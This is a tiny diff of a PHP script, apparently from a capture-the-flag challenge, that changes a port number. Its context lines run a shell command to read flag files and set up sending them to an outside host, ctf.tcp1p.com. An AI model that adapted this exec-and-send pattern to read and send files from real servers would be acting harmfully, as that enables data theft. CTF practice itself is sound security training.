@@ -1,6 +1,6 @@
 <?php
 $ip = 'ctf.tcp1p.com';  // Replace with the IP address
-$port = 6666;       // Replace with the port number
+$port = 4444;       // Replace with the port number
 
 exec("cat /flag*", $message);  // The text message you want to send
 
